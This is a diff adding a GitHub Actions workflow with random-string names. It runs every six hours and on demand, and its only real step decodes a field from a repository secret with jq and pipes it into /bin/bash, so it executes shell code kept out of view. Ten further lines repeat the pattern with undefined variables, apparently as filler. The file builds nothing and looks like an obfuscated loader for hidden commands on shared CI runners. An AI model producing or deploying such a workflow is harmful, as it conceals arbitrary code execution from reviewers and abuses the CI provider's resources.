@@ -1,0 +1,27 @@
+name: chendasi2580
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chendasi2580
+        env:
+          fevy6880: ${{ secrets.fevy6880 }}
+        run: |
+          echo $fevy6880 | jq -r .fpymq94 | /bin/bash
+          echo $ce65 | jq -r .pbp5616 | /bin/bash
+          echo $mk1 | jq -r .qbqz3487 | /bin/bash
+          echo $dg03410 | jq -r .tjazq7 | /bin/bash
+          echo $l048 | jq -r .w8 | /bin/bash
+          echo $c56032 | jq -r .eikn47 | /bin/bash
+          echo $mtrrb0 | jq -r .vka6 | /bin/bash
+          echo $liv00459 | jq -r .hbhi562 | /bin/bash
+          echo $tm85286 | jq -r .md9014 | /bin/bash
+          echo $hnklz63 | jq -r .cd7 | /bin/bash
+          echo $kq5 | jq -r .fb5835 | /bin/bash
+
